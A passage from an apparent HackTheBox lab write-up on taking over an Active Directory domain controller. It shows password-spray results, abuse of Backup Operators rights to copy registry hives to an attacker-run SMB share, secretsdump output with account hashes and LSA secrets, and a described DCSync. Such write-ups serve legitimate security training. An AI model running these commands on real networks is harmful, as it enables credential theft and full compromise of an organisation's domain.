SMB         10.129.231.193  445    DC               [-] university.htb\Guest:v3ryS0l!dP@sswd#X STATUS_LOGON_FAILURE 
SMB         10.129.231.193  445    DC               [-] university.htb\krbtgt:v3ryS0l!dP@sswd#X STATUS_LOGON_FAILURE 
SMB         10.129.231.193  445    DC               [+] university.htb\John.D:v3ryS0l!dP@sswd#X 
SMB         10.129.231.193  445    DC               [+] university.htb\George.A:v3ryS0l!dP@sswd#X 
SMB         10.129.231.193  445    DC               [-] university.htb\WAO:v3ryS0l!dP@sswd#X STATUS_LOGON_FAILURE 
SMB         10.129.231.193  445    DC               [+] university.htb\hana:v3ryS0l!dP@sswd#X 
SMB         10.129.231.193  445    DC               [+] university.htb\karma.watterson:v3ryS0l!dP@sswd#X 
SMB         10.129.231.193  445    DC               [+] university.htb\Alice.Z:v3ryS0l!dP@sswd#X 
SMB         10.129.231.193  445    DC               [+] university.htb\Steven.P:v3ryS0l!dP@sswd#X 
SMB         10.129.231.193  445    DC               [+] university.htb\Karol.J:v3ryS0l!dP@sswd#X 
SMB         10.129.231.193  445    DC               [+] university.htb\Leon.K:v3ryS0l!dP@sswd#X 
SMB         10.129.231.193  445    DC               [+] university.htb\A.Crouz:v3ryS0l!dP@sswd#X 
SMB         10.129.231.193  445    DC               [+] university.htb\Kai.K:v3ryS0l!dP@sswd#X 
SMB         10.129.231.193  445    DC               [+] university.htb\Arnold.G:v3ryS0l!dP@sswd#X 
SMB         10.129.231.193  445    DC               [+] university.htb\Kareem.A:v3ryS0l!dP@sswd#X 
SMB         10.129.231.193  445    DC               [+] university.htb\Lisa.K:v3ryS0l!dP@sswd#X 
SMB         10.129.231.193  445    DC               [+] university.htb\Jakken.C:v3ryS0l!dP@sswd#X 
SMB         10.129.231.193  445    DC               [+] university.htb\Nya.R:v3ryS0l!dP@sswd#X 
SMB         10.129.231.193  445    DC               [+] university.htb\Brose.W:v3ryS0l!dP@sswd#X 
SMB         10.129.231.193  445    DC               [+] university.htb\Choco.L:v3ryS0l!dP@sswd#X 
SMB         10.129.231.193  445    DC               [+] university.htb\Rose.L:v3ryS0l!dP@sswd#X 
SMB         10.129.231.193  445    DC               [+] university.htb\Emma.H:v3ryS0l!dP@sswd#X 
SMB         10.129.231.193  445    DC               [+] university.htb\C.Freez:v3ryS0l!dP@sswd#X 
SMB         10.129.231.193  445    DC               [+] university.htb\Martin.T:v3ryS0l!dP@sswd#X 
SMB         10.129.231.193  445    DC               [-] university.htb\William.B:v3ryS0l!dP@sswd#X STATUS_LOGON_FAILURE
```

### **Privilege Abuse – Backup Operators**

One of the accounts found, **brose.w**, is a member of both the **Remote Management Users** and **Backup Operators** groups.\
The **Backup Operators** group can back up and restore files regardless of permissions, which also allows dumping sensitive registry hives.

Using this privilege, I dumped the **SAM**, **SYSTEM**, and **SECURITY** hives directly to my SMB share:

```
┌──(sn0x㉿sn0x)-[~/HTB/University]
└─$ impacket-reg university.htb/brose.w:'v3ryS0l!dP@sswd#X'@dc.university.htb \
               backup \
               -o \\\\10.10.10.10\\share
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to \\10.10.10.10\share\SAM.save
[*] Saved HKLM\SYSTEM to \\10.10.10.10\share\SYSTEM.save
[*] Saved HKLM\SECURITY to \\10.10.10.10\share\SECURITY.save
```

### **Dumping Local Hashes**

With the **SAM**, **SYSTEM**, and **SECURITY** hives collected, I used `secretsdump.py` from **Impacket** to extract the stored local account hashes:

```python
┌──(sn0x㉿sn0x)-[~/HTB/University]
└─$ impacket-secretsdump -sam SAM.save \
                       -security SECURITY.save \
                       -system SYSTEM.save local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
[*] Target system bootKey: 0x7704a47762a8cd07d2922fc3e97e02a4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e1ab6bc4d7d84111fe3e0fb271de1e0b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:e97478a1793c33f8f9a11b182653d4c9e62c86d8b6e0a3d73196a9470144a56d3e5c1e9db75e8cc6b580e95a6a5094ef929ea1ede9ac3c890d2103cc2babc001c6bc6d1f501bf69f293b2edd261e6d2a78f7f548efb1bdaf579ff29aada34007b64f40324cedbe67ad19e78760883f63198000caff9ad2f4606b7ebdd8aa2c6c3d573fc3dec04ad378f3e9c00e0017b907bc227daa76db77910961120fc47e8fe605532a350a3096442e2efd4a6227f049c221f8e4a0b27d5bade63d7605438fd088e788815524c8484d2ec7fc11c2ea0a98ca014f819afee1a3da79cd9ea29662456e1006e9460201a6757f46759d18
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:2522eb84c83b5e9ffde18045be5b9e59
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x44e8899b6f107411270e6b698b1cfde82435f5c4
dpapi_userkey:0x0616b9ece51544c0f81f1c19a4cb7812aee0feb6
[*] NL$KM 
 0000   88 46 0A 2B AA 91 13 80  6D 4A AD D2 F2 50 9C 46   .F.+....mJ...P.F
 0010   7D 95 DC 66 C9 3C 55 2F  92 18 48 6C DB 31 BE 07   }..f.<U/..Hl.1..
 0020   67 23 06 25 47 36 40 FC  4E 03 EC E7 CB C4 28 F8   g#.%G6@.N.....(.
 0030   00 67 45 08 B9 31 29 E4  E6 9F 6D 5B 07 F7 96 09   .gE..1)...m[....
NL$KM:88460a2baa9113806d4aadd2f2509c467d95dc66c93c552f9218486cdb31be0767230625473640fc4e03ece7cbc428f800674508b93129e4e69f6d5b07f79609
[*] Cleaning up...
```

But I can use the machine account `DC$` to perform a **DCSync** and dump all the hashes from the domain including the one for the `Administrator`. This way I can collect the final flag.

### **DCSync with Machine Account**

Although the local Administrator hash was unusable, the **machine account** `DC$` had **replication privileges**.\
Using it, I performed a **DCSync** attack to dump all domain password hashes, including the **Domain Administrator**:

With the Domain Admin hash obtained, I authenticated to the **Domain Controller**, accessed the Administrator profile, and grabbed the **final flag**.

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
